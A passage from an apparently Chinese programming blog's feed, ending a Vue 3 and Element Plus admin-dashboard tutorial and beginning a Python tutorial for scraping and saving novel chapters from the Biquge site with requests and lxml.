class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123;  ref &#125; from &#x27;vue&#x27;</span><br><span class="line">import &#123;</span><br><span class="line">  Check, </span><br><span class="line">  Close,</span><br><span class="line">    Menu,</span><br><span class="line">  Menu as IconMenu,</span><br><span class="line">  User,</span><br><span class="line">  Setting,</span><br><span class="line">  ShoppingBag,</span><br><span class="line">  Memo,</span><br><span class="line">  PieChart,</span><br><span class="line">  Fold,</span><br><span class="line">  ElemeFilled,</span><br><span class="line">  ChromeFilled,</span><br><span class="line">  Opportunity,</span><br><span class="line">  Edit,</span><br><span class="line">  Delete,</span><br><span class="line">&#125; from &#x27;@element-plus/icons-vue&#x27;</span><br><span class="line"></span><br><span class="line">const value2=ref(true)</span><br><span class="line">const currentPage3 = ref(5)</span><br><span class="line">const pageSize3 = ref(100)</span><br><span class="line">const small = ref(false)</span><br><span class="line">const background = ref(false)</span><br><span class="line">const disabled = ref(false)</span><br><span class="line"></span><br><span class="line">const handleSizeChange = (val) =&gt; &#123;</span><br><span class="line">  console.log(`$&#123;val&#125; items per page`)</span><br><span class="line">&#125;</span><br><span class="line">const handleCurrentChange = (val) =&gt; &#123;</span><br><span class="line">  console.log(`current page: $&#123;val&#125;`)</span><br><span class="line">&#125;</span><br><span class="line">const input = ref(&#x27;&#x27;)</span><br><span class="line">const handleOpen = (key, keyPath) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line">const handleClose = (key, keyPath) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const tableData = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: 1,</span><br><span class="line">    name: &#x27;Tom&#x27;,</span><br><span class="line">    email: &#x27;1111111@qq.com&#x27;,</span><br><span class="line">    phone:123456,</span><br><span class="line">    nickname:&#x27;tom1&#x27;,</span><br><span class="line">    value2:true,</span><br><span class="line">    data:&#x27;2016-05-01&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: 2,</span><br><span class="line">    name: &#x27;lin&#x27;,</span><br><span class="line">    email: &#x27;2222222@qq.com&#x27;,</span><br><span class="line">    phone:456789,</span><br><span class="line">    nickname:&#x27;lin1&#x27;,</span><br><span class="line">    value2:false,</span><br><span class="line">    data:&#x27;2016-05-02&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;full-screen-div&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;common-layout&quot;&gt;</span><br><span class="line">        &lt;el-container&gt;</span><br><span class="line">          &lt;el-aside class=&quot;ce&quot;&gt;</span><br><span class="line">            &lt;h1 class=&quot;title&quot;&gt;xxx管理系统&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">            &lt;el-row class=&quot;tac&quot;&gt;</span><br><span class="line"></span><br><span class="line">                &lt;el-col :span=&quot;24&quot;&gt;</span><br><span class="line">                  </span><br><span class="line">                  &lt;el-menu</span><br><span class="line">                    active-text-color=&quot;#ffd04b&quot;</span><br><span class="line">                    background-color=&quot;#344155&quot;</span><br><span class="line">                    class=&quot;el-menu-vertical-demo&quot;</span><br><span class="line">                    default-active=&quot;1&quot;</span><br><span class="line">                    text-color=&quot;#fff&quot;</span><br><span class="line">                    ref=&quot;menu&quot;</span><br><span class="line">                    @open=&quot;handleOpen&quot;</span><br><span class="line">                    @close=&quot;handleClose&quot;</span><br><span class="line">                    @click=&quot;handleMenuClick&quot;</span><br><span class="line">                  &gt;</span><br><span class="line">                    &lt;el-sub-menu index=&quot;1-1&quot;&gt;</span><br><span class="line">                      &lt;template #title&gt;</span><br><span class="line">                        &lt;el-icon&gt;&lt;User /&gt;&lt;/el-icon&gt;</span><br><span class="line">                        &lt;span&gt;用户管理&lt;/span&gt;</span><br><span class="line">                      &lt;/template&gt;</span><br><span class="line">                      &lt;el-menu-item index=&quot;1&quot;&gt;</span><br><span class="line">                        &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                        用户列表</span><br><span class="line">                    &lt;/el-menu-item&gt;</span><br><span class="line">                    &lt;/el-sub-menu&gt;</span><br><span class="line">                    &lt;el-sub-menu index=&quot;2-2&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Setting /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;权限管理&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;2&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            权限列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                      &lt;el-sub-menu index=&quot;3-3&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;ShoppingBag /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;商品管理&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;3&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            商品列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                      &lt;el-sub-menu index=&quot;4-4&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Memo /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;订单管理&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;4&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            订单列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                      &lt;el-sub-menu index=&quot;5-5&quot;&gt;</span><br><span class="line">                        &lt;template #title&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;PieChart /&gt;&lt;/el-icon&gt;</span><br><span class="line">                          &lt;span&gt;数据统计&lt;/span&gt;</span><br><span class="line">                        &lt;/template&gt;</span><br><span class="line">                        &lt;el-menu-item index=&quot;5&quot;&gt;</span><br><span class="line">                            &lt;el-icon&gt;&lt;Menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">                            数据列表&lt;/el-menu-item&gt;</span><br><span class="line">                      &lt;/el-sub-menu&gt;</span><br><span class="line">                  &lt;/el-menu&gt;</span><br><span class="line">                &lt;/el-col&gt;</span><br><span class="line">              &lt;/el-row&gt;</span><br><span class="line">            </span><br><span class="line">        &lt;/el-aside&gt;</span><br><span class="line">        &lt;el-container&gt;</span><br><span class="line">            &lt;el-header&gt;</span><br><span class="line">                &lt;div class=&quot;head&quot;&gt;</span><br><span class="line">                  &lt;el-icon&gt;&lt;Fold /&gt;&lt;/el-icon&gt;</span><br><span class="line">                  &lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;首页&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;/&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt; </span><br><span class="line">                  &lt;span&gt;用户列表&lt;/span&gt;</span><br><span class="line">                  &lt;div class=&quot;components&quot;&gt;</span><br><span class="line">                    &lt;el-icon class=&quot;component&quot;&gt;&lt;ElemeFilled /&gt;&lt;/el-icon&gt;</span><br><span class="line">                    &lt;el-icon class=&quot;component&quot;&gt;&lt;ChromeFilled /&gt;&lt;/el-icon&gt;</span><br><span class="line">                    &lt;el-icon class=&quot;component&quot;&gt;&lt;Opportunity /&gt;&lt;/el-icon&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">            &lt;/el-header&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &lt;el-main&gt;</span><br><span class="line">              &lt;div class=&quot;main1&quot;&gt;</span><br><span class="line">                &lt;el-row :span=&quot;2&quot; &gt;</span><br><span class="line">                  &lt;el-col :span=&quot;6&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                    &lt;el-input v-model=&quot;input&quot; placeholder=&quot;Please input&quot; /&gt;</span><br><span class="line">                  &lt;/el-col&gt;</span><br><span class="line">                  &lt;el-col :span=&quot;3&quot;  class=&quot;center&quot;&gt;</span><br><span class="line">                    &lt;el-button type=&quot;primary&quot;&gt;搜索&lt;/el-button&gt;</span><br><span class="line">                  &lt;/el-col&gt;</span><br><span class="line">                  &lt;el-col :span=&quot;2&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                    &lt;el-button type=&quot;primary&quot;&gt;添加用户&lt;/el-button&gt;</span><br><span class="line">                  &lt;/el-col&gt;</span><br><span class="line">                &lt;/el-row&gt;</span><br><span class="line">                </span><br><span class="line">                &lt;el-row :span=&quot;15&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                  &lt;el-table :data=&quot;tableData&quot; border style=&quot;width: 100%&quot;&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;id&quot; label=&quot;#&quot; width=&quot;60&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;name&quot; label=&quot;Name&quot; width=&quot;120&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;email&quot; label=&quot;Email&quot; width=&quot;180&quot;/&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;phone&quot; label=&quot;Phone&quot; width=&quot;130&quot;/&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;nickname&quot; label=&quot;NickNmae&quot; width=&quot;120&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column  label=&quot;State&quot; width=&quot;150&quot; v-slot=&quot;&#123;row&#125;&quot;  &gt;</span><br><span class="line">                      &lt;el-switch</span><br><span class="line">                          v-model=&quot;row.value2&quot;</span><br><span class="line">                          class=&quot;mt-2&quot;</span><br><span class="line">                          style=&quot;margin-left: 24px&quot;</span><br><span class="line">                          inline-prompt</span><br><span class="line">                          :active-icon=&quot;Check&quot;</span><br><span class="line">                          :inactive-icon=&quot;Close&quot;</span><br><span class="line">                        /&gt;</span><br><span class="line">                    &lt;/el-table-column&gt;</span><br><span class="line">                    &lt;el-table-column prop=&quot;data&quot; label=&quot;CreateData&quot; width=&quot;180&quot; /&gt;</span><br><span class="line">                    &lt;el-table-column label=&quot;操作&quot;&gt;</span><br><span class="line">                      &lt;template #default=&quot;scope&quot;&gt;</span><br><span class="line">                        &lt;el-button size=&quot;small&quot; color=&quot;#589DF6&quot;&gt;&lt;el-icon color=&quot;#FFFFFF&quot; &gt;&lt;Edit/&gt;&lt;/el-icon&gt;&lt;/el-button&gt;</span><br><span class="line">                        &lt;el-button size=&quot;small&quot; color=&quot;#E47471&quot; &gt;&lt;el-icon color=&quot;#FFFFFF&quot;&gt;&lt;Delete /&gt;&lt;/el-icon&gt;&lt;/el-button&gt;</span><br><span class="line">                        &lt;el-button size=&quot;small&quot; color=&quot;#DCA452&quot; &gt;&lt;el-icon color=&quot;#FFFFFF&quot;&gt;&lt;Setting /&gt;&lt;/el-icon&gt;&lt;/el-button&gt;</span><br><span class="line">                      &lt;/template&gt;</span><br><span class="line">                    &lt;/el-table-column&gt;</span><br><span class="line">                  &lt;/el-table&gt;</span><br><span class="line">                &lt;/el-row&gt;</span><br><span class="line"></span><br><span class="line">                &lt;el-row :span=&quot;2&quot; class=&quot;center&quot;&gt;</span><br><span class="line">                  &lt;div class=&quot;demo-pagination-block&quot;&gt;</span><br><span class="line">                    &lt;el-pagination</span><br><span class="line">                      v-model:current-page=&quot;currentPage3&quot;</span><br><span class="line">                      v-model:page-size=&quot;pageSize3&quot;</span><br><span class="line">                      :small=&quot;small&quot;</span><br><span class="line">                      :disabled=&quot;disabled&quot;</span><br><span class="line">                      :background=&quot;background&quot;</span><br><span class="line">                      layout=&quot;prev, pager, next, jumper&quot;</span><br><span class="line">                      :total=&quot;1000&quot;</span><br><span class="line">                      @size-change=&quot;handleSizeChange&quot;</span><br><span class="line">                      @current-change=&quot;handleCurrentChange&quot;</span><br><span class="line">                    /&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">                &lt;/el-row&gt;</span><br><span class="line"></span><br><span class="line">              &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;/el-main&gt;</span><br><span class="line">          &lt;/el-container&gt;</span><br><span class="line">        &lt;/el-container&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.full-screen-div &#123;</span><br><span class="line">    position: fixed;</span><br><span class="line">    top: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">    background-color: white;</span><br><span class="line">    z-index: 9999;</span><br><span class="line">&#125;</span><br><span class="line">.ce&#123;</span><br><span class="line">    width: 15vw;</span><br><span class="line">    height: 100vh;</span><br><span class="line">    background: #344155;</span><br><span class="line">&#125;</span><br><span class="line">.title&#123;</span><br><span class="line">    padding-top: 15px;</span><br><span class="line">    font-size: 20px;</span><br><span class="line">    color: white;</span><br><span class="line">    text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">.head&#123;</span><br><span class="line">    font-size: 20px;</span><br><span class="line">    padding-top: 30px;</span><br><span class="line">    padding-bottom: 13px;</span><br><span class="line">    border-bottom: 1px solid black;</span><br><span class="line">    font-family: &#x27;黑体&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">.components &#123;  </span><br><span class="line">  position: absolute;  </span><br><span class="line">  top: 10px;</span><br><span class="line">  right: 30px;  </span><br><span class="line">  align-items: center;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">.component &#123;  </span><br><span class="line">  width: 50px;</span><br><span class="line">  height: 50px;</span><br><span class="line">  margin-right: 30px;  </span><br><span class="line">&#125;</span><br><span class="line">.main1 &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 80%;</span><br><span class="line">  border-bottom: 10px solid #EBEBEB; /* 设置下边框的宽度、样式和颜色 */  </span><br><span class="line">  box-shadow: 0 2px 3px #EBEBEB; /* 在下边框上添加阴影 */</span><br><span class="line">&#125;</span><br><span class="line">.center&#123;</span><br><span class="line">  display: flex;  </span><br><span class="line">  justify-content: center; /* 水平居中 */</span><br><span class="line">  padding-bottom: 20px;</span><br><span class="line">  padding-top: 10px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312112141494.png" alt="image-20231211212056199"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1，要使用vue前先下载node-js&quot;&gt;&lt;a href=&quot;#1，要使用vue前先下载node-js&quot; class=&quot;headerlink&quot; title=&quot;1，要使用vue前先下载node.js&quot;&gt;&lt;/a&gt;1，要使用vue前先下载node.js&lt;/h4&gt;&lt;p&gt;下载</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十五，python爬虫-小说下载器</title>
    <link href="http://example.com/2023/12/08/%E4%BA%8C%E5%8D%81%E4%BA%94%EF%BC%8Cpython%E7%88%AC%E8%99%AB-%E5%B0%8F%E8%AF%B4%E4%B8%8B%E8%BD%BD%E5%99%A8/"/>
    <id>http://example.com/2023/12/08/%E4%BA%8C%E5%8D%81%E4%BA%94%EF%BC%8Cpython%E7%88%AC%E8%99%AB-%E5%B0%8F%E8%AF%B4%E4%B8%8B%E8%BD%BD%E5%99%A8/</id>
    <published>2023-12-08T13:10:21.000Z</published>
    <updated>2023-12-08T13:20:52.895Z</updated>
    
    <content type="html"><![CDATA[<p>​用python爬虫制作一个爬取笔趣阁网站小说并且下载的程序，以下是 详细步骤：</p><p>1，先下载该程序所需的库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先到Python的安装目录的Scripts文件夹下，进入cmd命令窗口</span><br><span class="line"># requests库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ requests</span><br><span class="line"># lxml库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ lxml</span><br><span class="line"># urllib库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ urllib</span><br><span class="line"># prettytable库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ prettytable</span><br><span class="line"># pyinstaller 库</span><br><span class="line">pip install -i https://mirrors.aliyun.com/pypi/simple/ pyinstaller</span><br></pre></td></tr></table></figure><p>2，因为爬虫需要多次请求网站并且获取回复，所以创建novel0.py，先封装一个get请求获取response的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 公共方法</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 输入url用get方法获取response</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_response</span>(<span class="params">url</span>):</span><br><span class="line">    headers=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;Hm_lvt_dd315b2f7503b4902afb3af0c37c3847=1700455793,1701781492; clickbids=78909; bcolor=; font=; size=; fontcolor=; width=; Hm_lpvt_dd315b2f7503b4902afb3af0c37c3847=1701781516&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>​    headers请求头内含User-Agent，Accept，Cookie三个可以确保请求到网页内容</p><p>3，下载单张小说，创建novel1.py，封装一个输入小说下载地址和小说名称，会保存到本地novels文件夹下为：小说名称.txt文件，其中调用一个方法检查目录下是否有novels文件夹，若没有则进行创建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载单张小说</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> novel0</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> novel5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_chapters</span>(<span class="params">url,name</span>):</span><br><span class="line">    response=novel0.get_response(url)</span><br><span class="line">    contect=response.text</span><br><span class="line">    <span class="comment"># 检查响应的编码类型</span></span><br><span class="line">    encoding = response.encoding</span><br><span class="line">    <span class="comment"># 如果不是UTF-8，则将内容转换为UTF-8</span></span><br><span class="line">    <span class="keyword">if</span> encoding != <span class="string">&#x27;utf-8&#x27;</span>:</span><br><span class="line">        contect = contect.encode(encoding).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    tree=etree.HTML(contect)</span><br><span class="line">    <span class="comment"># 拿到标题</span></span><br><span class="line">    title=tree.xpath(<span class="string">&#x27;//h1/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;下载&#x27;</span>+title)</span><br><span class="line">    <span class="comment"># 拿到正文内容</span></span><br><span class="line">    content=tree.xpath(<span class="string">&#x27;//div[@id=&quot;content&quot;]/text()&#x27;</span>)</span><br><span class="line">    <span class="comment"># 去掉多余字符，只保留中文文本内容</span></span><br><span class="line">    content=<span class="string">&#x27;\n&#x27;</span>.join([para.strip() <span class="keyword">for</span> para <span class="keyword">in</span> content])</span><br><span class="line">    dir_name=get_novels()</span><br><span class="line">    path=dir_name+<span class="string">&#x27;/novels/&#x27;</span>+name+<span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,mode=<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(title)</span><br><span class="line">        fp.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        fp.write(content)</span><br><span class="line">        fp.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># 将路径赋值给novel5的某个属性或方法</span></span><br><span class="line">    novel5.path = path</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_novels</span>():</span><br><span class="line">    <span class="comment"># 获取当前文件所在的目录的路径</span></span><br><span class="line">    current_dir = os.path.dirname(__file__)</span><br><span class="line">    <span class="comment"># 获取当前文件夹名称</span></span><br><span class="line">    dir_name = os.path.basename(current_dir)</span><br><span class="line">    <span class="comment"># 检查novels文件夹是否存在</span></span><br><span class="line">    novels_dir = os.path.join(current_dir, <span class="string">&#x27;novels&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(novels_dir):</span><br><span class="line">        <span class="comment"># 如果不存在，创建novels文件夹</span></span><br><span class="line">        os.makedirs(novels_dir)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;创建novels文件夹&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> dir_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用xpath获取小说的章节标题和各章的内容,下载完成后将路径发送给novel5</p><p>4，按照小说目录下载整本小说，创建novel2.py，封装一个输入小说的目录地址，调用novel1中的方法下载各章小说：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td 